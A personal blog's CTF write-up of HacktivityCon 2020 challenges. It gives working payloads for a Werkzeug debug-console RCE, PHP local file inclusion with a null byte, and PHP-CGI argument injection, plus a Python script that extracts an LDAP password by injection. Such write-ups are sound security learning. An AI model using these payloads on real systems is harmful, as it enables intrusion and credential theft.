---
layout: "post"
title: "HacktivityCon CTF 2020 Writeup."
date: "2020-08-02 03:43:41"
date_gmt: "2020-08-02 03:43:41"
modified: "2020-08-02 03:43:41"
modified_gmt: "2020-08-02 03:43:41"
slug: "hacktivitycon-ctf-2020-writeup"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/08/02/hacktivitycon-ctf-2020-writeup/"
guid: "http://y4y.space/?p=96"
wordpress_id: 96
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
So I only did some problems, most of then being web challenges. I had to take my OSCP exam so didn't spend too much time on this CTF. I mean I don't spend much time on all CTFs anyway.

## Misc

### Pseudo

#### Challenge Description

Someone here has special powers… but who? And how!?
Connect here:
ssh -p 50014 user@jh2i.com # password is 'userpass'

#### Solution

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-21-18-12.png?w=720)

As you can tell the home directory is pretty exciting.
I checked around and did not find anything interesting. So I run linpeas.sh and see what interesting files are out there.

Linpeas found out in /etc/sudoer.d there is a README file and says that todd can run all commands as root without providing password. So I went to /etc/sudoer.d and checked that file out myself.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-21-20-32.png?w=1024)

So now I have the creds for todd, and I will just su as him.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-21-21-16.png?w=1024)

Flag is in root directory.

#### Flag

flag{hmmm_that_could_be_a_sneaky_backdoor}

## Web

### Ladybug

#### Challenge Description

Want to check out the new Lady**bug** Cartoon? It's still in production, so feel free to send in suggestions!
http://jh2i.com:50018

#### Solution

Here is the index page.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-13-41-32.png?w=1024)

I tried multiple things first but found no success. Then I checked HTTP request and found out the site is running Werkzeug Python server.

The exact version is Werkzeug 1.0.1.
`curl -vvv http://jh2i.com:50018`

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-13-46-54.png?w=974)

And here is the concole. To pull out console, click on the right of CMD icon.

The rest is simple. The server is lagging hard so it took me multiple commands to make a single one work. But regardless the flag is just in the same directory. Here is series of command I used.

```python
import os;os.popen('ls -la').read()
open('flag.txt', 'r').read()
```

#### Flag

flag{weurkzerg_the_worst_kind_of_debug}

### Bite

#### Challenge Description

Want to learn about binary units of information? Check out the "Bite of Knowledge" website!

Connect here:
[http://jh2i.com:50010](http://jh2i.com:50010)

#### Solution

Seems like it's including another page. But first let's figure out if the site is running php.

I go to page index.php and it returns the index page, which confirms the site is running PHP.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-13-35-46.png?w=951)

Next let's play with file inclusion.

First try /etc/passwd.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-13-37-04.png?w=1024)

So the backend is appending .php to all the pages included, which makes sense since the URL earlier was not bit.php. I then tried PHP filter but did not work either, just in case anyone is curious the payload is
`?page=php://filter/convert.base64-encode/resource=index`.

Then I thought maybe a null byte would work, since null byte is the string terminator.

And guess what, it works.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-13-39-26.png?w=1024)

Flag is just called flag.txt. Null byte has been a vulnerability for so long so don't expect it to happen that often.

#### Flag

flag{lfi_just_needed_a_null_byte}

### GI Joe

#### Challenge Description

http://jh2i.com:50008/

#### Solution

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-17-14-36.png?w=1024)

After clicking around and realized nothing will lead me to a new page, I decided to intercept the request.

Here is the header of HTTP request.

```http
HTTP/1.1 200 OK
Date: Thu, 30 Jul 2020 00:12:47 GMT
Server: Apache/2.4.25 (Unix)
X-Powered-By: PHP/5.4.1
Connection: close
Content-Type: text/html
Content-Length: 8156
```

The first thing I noticed is the PHP version is quite old, the most recent is like 7.x and this one is 5.4.1.
So right off the bat I went to google and search for PHP 5.4.1 exploit. I was not disappointed, it turns out for Apache and PHP version earlier than 5.4.3 or 5.3.13 there is a cgi-bin command injection RCE.

[This](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/php-cgi-exploitation-by-example/) article has a really good POC so I will leave it here.

I replicated the attack and tried for the most basic cgi-bin flag, which is to view the source to check if the vulnerability exists. And guess what. (The -s flag is for source.)

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-17-19-57.png?w=1024)

Now I know where the flag is, go read it.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-17-20-50.png?w=1024)

Note that more damage can be done since there is RCE, but in a CTF like this everything will be run in docker, so I didn't bother to get a shell.

The URL: "http://jh2i.com:50008/index.php?-d allow_url_include=1 -d auto_prepend_file=php://input"

#### Flag

flag{old_but_gold_attacks_with_cgi_joe}

### Lightweight Contact Book

#### Challenge Description

http://jh2i.com:50019/

#### Solution

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-37-55.png?w=1024)

Given another search bar, so the first thing I tried is of course SQL injection. But this time nothing errored out. Then I tried to put ')' and magic happened.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-39-10.png?w=1024)

Based on the character it errored out and the name of challenge, I know it's LDAP injection because the L in LDAP stands for lightweight and a LDAP query often looks like this:
"(&(username='admin')(password='fakepassword')".

Next is to figure out which field in LDAP stores password. So I tried 'forgot password' with the username 'administrator'.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-41-51.png?w=1024)

Now everything is clear, do the LDAP injection and dump the data stored in the desctiption field. To make sure the basic payload works, I tried "administrator)(description=*" which should return the administrator user.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-45-26.png?w=1024)

And yes, it works. Next is to build a script.

##### inj.py

```python
#!/usr/bin/env python

import requests as r
import string
import sys

url = 'http://jh2i.com:50019/?search=administrator)('

charset = string.printable

pwd = ''
while 1:
    for c in charset:
        sys.stdout.write('\r\ntrying %s'%(pwd+c))
        try:
            req = r.get(url + 'description=%s*'%(pwd+c))
            resp = req.content
            if  'Administrator User' in resp:
                print('found a hit! ' + c)
                pwd += c
                break
            else:
                continue
        except KeyboardInterrupt:
            sys.exit()
        except:
            print('???')
```

Here is the console output after I left it running for a while.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-46-50.png?w=988)

And I guess the password is just "very_secure_hacktivity_pass".

Now login with the credentials, the flag comes.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-07-29-15-36-59.png?w=1024)

#### Flag

flag{kids_please_sanitize_your_inputs}

## Conclusion

Those are the challenges I think worth explaining. I also did Waffle web challenge, but I decided to go full script kiddie and used sqlmap so it's just not worthy saying. LDAP injection is pretty cool, I think it's the first time I have ever seen a LDAP problem in a CTF. The php cgi one is also fun, I never knew such thing existed. But anyway, that's all.
{% endraw %}
